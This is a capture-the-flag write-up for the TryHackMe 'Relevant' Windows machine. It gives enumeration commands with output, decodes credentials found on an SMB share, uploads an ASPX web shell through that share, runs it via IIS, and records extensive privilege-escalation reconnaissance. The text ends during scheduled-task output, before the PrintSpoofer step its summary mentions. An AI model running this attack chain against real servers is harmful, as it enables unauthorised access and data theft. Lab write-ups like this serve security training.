# [Relevant](https://tryhackme.com/room/relevant)

> Enumeration of the box revealsa a writable SMB share and an IIS server on port 49663. The SMB share is browsable via the IIS server. Writing an ASPX web shell to the share and then executing it via the IIS server yields the user flag. The user has the `SeImpersonatePrivilege` privilege, which is exploited via [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) for SYSTEM, yielding the root flag.

#windows #iis #aspx #smb #SeImpersonatePrivilege #PrintSpoofer

# Open Port Discovery

```bash
$ masscan -p1-65535 10.10.75.234 --rate=1000 -e tun0 --output-format grepable --output-filename relevant-tcp.masscan
$ cat relevant-tcp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','

3389,49669,80,139,49663
```

```bash
$ masscan -pU:1-65535 10.10.75.234 --rate=1000 -e tun0 --output-format grepable --output-filename relevant-udp.masscan
$ cat relevant-udp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','


```
- 0 UDP ports found

# Open Port Enumeration

```bash
$ nmap -sC -sV -O -p3389,49669,80,139,49663 10.10.75.234 -oA relevant

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 00:58 CDT
Nmap scan report for 10.10.75.234
Host is up (0.099s latency).

PORT      STATE    SERVICE       VERSION
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-16T05:59:04+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-07-15T04:27:21
|_Not valid after:  2022-01-14T04:27:21
|_ssl-date: 2021-07-16T05:59:44+00:00; +1s from scanner time.
49663/tcp open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49669/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.83 seconds
```

## HTTP Port 80 Enumeration

```bash
$ nikto -h http://10.10.75.234

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.75.234
+ Target Hostname:    10.10.75.234
+ Target Port:        80
+ Start Time:         2021-07-16 00:22:36 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 

n+ 7897 requests: 7 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-07-16 00:40:56 (GMT-5) (1100 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
$ gobuster dir -u http://10.10.75.234 -w
/usr/share/wordlists/Seclists/Discovery/Web-Content/big.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.234
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 00:39:49 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2021/07/16 00:43:15 Finished
===============================================================
```

## HTTP Port 49663 Enumeration

```bash
$ gobuster dir -u http://10.10.75.234:49663 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/big.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.234:49663
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/16 01:01:24 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 163] [--> http://10.10.75.234:49663/aspnet_client/]
                                                                                              
===============================================================
2021/07/16 01:04:50 Finished
===============================================================
```

- Interesting find: `/aspnet_client`

## SMB Enumeration

Since `masscan` was showing port 139 open, run SMB enumeration against port 445.

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.75.234

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 01:29 CDT
Nmap scan report for 10.10.75.234
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.75.234\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.75.234\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.75.234\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.75.234\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 42.92 seconds
```

- Interesting share: `nt4wrksv`

```bash
$ smbclient -U anonymous //10.10.75.234/nt4wrksv


Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 16 01:36:01 2021
  ..                                  D        0  Fri Jul 16 01:36:01 2021
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

                7735807 blocks of size 4096. 5162814 blocks available
```

- Interesting file: `passwords.txt`

```bash
$ cat passwords.txt

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Both passwords are base64-encoded. Decoded, they result in the credentials:

- `Bob`:`!P@$$W0rD!123`
- `Bill`:`Juw4nnaM4n420696969!$$$`

However, neither password works for any of the SMB shares nor for RDP.

It looks like the `nt4wrksv` share is also bound to the IIS server on port 49663 at URI `http://target:49663/nt4wrksv/`. If we can upload an ASP payload into this share via SMB and then navigate to it via IIS, we'll have RCE.

# SMB & HTTP Remote Code Execution

## Upload ASPX webshell via SMB

```bash
$ cp /usr/share/webshells/aspx/cmdasp.aspx .
$ mv cmdasp.aspx upload-form.aspx
$ smbclient -U anonymous //10.10.101.165/nt4wrksv

Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> put upload-form.aspx
```

## Interact with ASPX webshell

![Pasted image 20210719093701](images/Pasted%20image%2020210719093701.png)

## User flag

The web application pool user has access to the user flag on user Bob's desktop.

```cmd
type C:\Users\Bob\Desktop\user.txt
```

![](images/Pasted%20image%2020210809102207.png)

# Privilege Escalation Enumeration

## Enumeration

### System Information

#### Operating system version

```cmd
$ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
```

#### Installed patches

```cmd
$ wmic qfe get Caption,Description,HotFixID,InstalledOn

Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=3192137  Update           KB3192137  9/12/2016
http://support.microsoft.com/?kbid=3211320  Update           KB3211320  1/7/2017
http://support.microsoft.com/?kbid=3213986  Security Update  KB3213986  1/7/2017
```

### Environment Variables

```cmd
$ set


ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Windows\system32\config\systemprofile\AppData\Roaming
APP_POOL_CONFIG=C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config
APP_POOL_ID=DefaultAppPool
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=RELEVANT
ComSpec=C:\Windows\system32\cmd.exe
LOCALAPPDATA=C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Windows\TEMP
TMP=C:\Windows\TEMP
USERDOMAIN=WORKGROUP
USERNAME=RELEVANT$
USERPROFILE=C:\Windows\system32\config\systemprofile
windir=C:\Windows
```

#### Internet settings

```cmd
$ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
    User Agent    REG_SZ    Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    IE5_UA_Backup_Flag    REG_SZ    5.0
    ZonesSecurityUpgrade    REG_BINARY    F3C0D3C3AC62D601

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones

$ reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings
    ActiveXCache    REG_SZ    C:\Windows\Downloaded Program Files
    CodeBaseSearchPath    REG_SZ    CODEBASE
    EnablePunycode    REG_DWORD    0x1
    MinorVersion    REG_SZ    0
    WarnOnIntranet    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Accepted Documents
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ActiveX Cache
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedBehaviors
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedDragImageExts
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AllowedDragProtocols
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ApprovedActiveXInstallSites
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Last Update
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Lockdown_Zones
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\LUI
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\NoFileLifetimeExtension
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\P3P
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Passport
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\PluggableProtocols
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Secure Mime Handlers
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\SO
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\SOIEAK
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\TemplatePolicies
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Url History
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\User Agent
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones
```

#### Drives

```cmd
$ wmic logicaldisk get caption || fsutil fsinfo drives

Caption
C:
```

### Hostname

```cmd
$ hostname

Relevant
```

### Current user

```cmd
$ whoami

iis apppool\defaultapppool
```

```cmd
$ whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` can be leveraged for privilege escalation [here](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens).


### Users

```cmd
$ net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Bob                      DefaultAccount           
Guest                    
The command completed with one or more errors.
```

#### User: Bob

```cmd
$ net user Bob

User name                    Bob
Full Name                    Bob
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/25/2020 2:03:20 PM
Password expires             Never
Password changeable          7/25/2020 2:03:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

#### User: Administrator

```bash
$ net user Administrator

User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/25/2020 7:56:59 AM
Password expires             Never
Password changeable          7/25/2020 7:56:59 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/25/2020 2:42:14 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

### Groups

```cmd
$ net localgroup

Aliases for \\RELEVANT

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
```

#### Administrators

```cmd
$ net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

Just `Administrator`

### Network interfaces

```cmd
$ ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Relevant
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com
                                       eu-west-1.compute.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-96-64-0E-5F-D1
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::9832:bf65:1b89:8800%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.101.165(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Monday, July 19, 2021 6:13:29 AM
   Lease Expires . . . . . . . . . . : Monday, July 19, 2021 7:43:30 AM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 101073078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection* 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:3047:3d9d:f5f5:9a5a(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::3047:3d9d:f5f5:9a5a%3(Preferred) 
   Default Gateway . . . . . . . . . : ::
   DHCPv6 IAID . . . . . . . . . . . : 134217728
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AE-44-DC-08-00-27-7C-35-30
   NetBIOS over Tcpip. . . . . . . . : Disabled

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

### Routing Table

```cmd
$ route print

===========================================================================
Interface List
  4...02 96 64 0e 5f d1 ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
 10...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0        10.10.0.1    10.10.101.165     25
        10.10.0.0      255.255.0.0         On-link     10.10.101.165    281
    10.10.101.165  255.255.255.255         On-link     10.10.101.165    281
    10.10.255.255  255.255.255.255         On-link     10.10.101.165    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  169.254.169.123  255.255.255.255        10.10.0.1    10.10.101.165     50
  169.254.169.249  255.255.255.255        10.10.0.1    10.10.101.165     50
  169.254.169.250  255.255.255.255        10.10.0.1    10.10.101.165     50
  169.254.169.251  255.255.255.255        10.10.0.1    10.10.101.165     50
  169.254.169.253  255.255.255.255        10.10.0.1    10.10.101.165     50
  169.254.169.254  255.255.255.255        10.10.0.1    10.10.101.165     50
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     10.10.101.165    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     10.10.101.165    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
  169.254.169.254  255.255.255.255        10.10.0.1      25
  169.254.169.250  255.255.255.255        10.10.0.1      25
  169.254.169.251  255.255.255.255        10.10.0.1      25
  169.254.169.249  255.255.255.255        10.10.0.1      25
  169.254.169.123  255.255.255.255        10.10.0.1      25
  169.254.169.253  255.255.255.255        10.10.0.1      25
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  3    331 ::/0                     On-link
  1    331 ::1/128                  On-link
  3    331 2001::/32                On-link
  3    331 2001:0:2851:782c:3047:3d9d:f5f5:9a5a/128
                                    On-link
  4    281 fe80::/64                On-link
  3    331 fe80::/64                On-link
  3    331 fe80::3047:3d9d:f5f5:9a5a/128
                                    On-link
  4    281 fe80::9832:bf65:1b89:8800/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
  3    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

### ARP Table

```cmd
$ arp -A

Interface: 10.10.101.165 --- 0x4
  Internet Address      Physical Address      Type
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic   
  10.10.255.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

### Active Network Connections

- Serving:
	- RDP
	- WinRM

```cmd
$ netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49663          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       740
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       796
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       728
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1824
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       732
  TCP    10.10.101.165:139      0.0.0.0:0              LISTENING       4
  TCP    10.10.101.165:49663    10.6.31.77:47220       TIME_WAIT       0
  TCP    10.10.101.165:49663    10.6.31.77:47224       ESTABLISHED     4
  TCP    10.10.101.165:49885    20.49.150.241:443      SYN_SENT        1916
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       876
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       612
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49663             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       624
  TCP    [::]:49665             [::]:0                 LISTENING       740
  TCP    [::]:49666             [::]:0                 LISTENING       796
  TCP    [::]:49667             [::]:0                 LISTENING       728
  TCP    [::]:49669             [::]:0                 LISTENING       1824
  TCP    [::]:49672             [::]:0                 LISTENING       732
  UDP    0.0.0.0:123            *:*                                    1112
  UDP    0.0.0.0:3389           *:*                                    612
  UDP    0.0.0.0:5050           *:*                                    1112
  UDP    0.0.0.0:5353           *:*                                    1232
  UDP    0.0.0.0:5355           *:*                                    1232
  UDP    10.10.101.165:137      *:*                                    4
  UDP    10.10.101.165:138      *:*                                    4
  UDP    [::]:123               *:*                                    1112
  UDP    [::]:3389              *:*                                    612
  UDP    [::]:5353              *:*                                    1232
  UDP    [::]:5355              *:*                                    1232
```

### Firewall State

- Though the server is listening on port 3389, RDP access is restricted by the firewall

```cmd
$ netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
49663  TCP       Any      (null)

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
```

```cmd
$ netsh firewall show config

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable

Service configuration for Domain profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          Remote Desktop

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
49663  TCP       Enable  Inbound               49663 Inbound

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          File and Printer Sharing
Enable   Yes         Network Discovery
Enable   No          Remote Desktop

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
49663  TCP       Enable  Inbound               49663 Inbound

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big
Enable   8     Allow inbound echo request

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488.
```

### Scheduled Tasks

```cmd
Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\.NET Framework
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
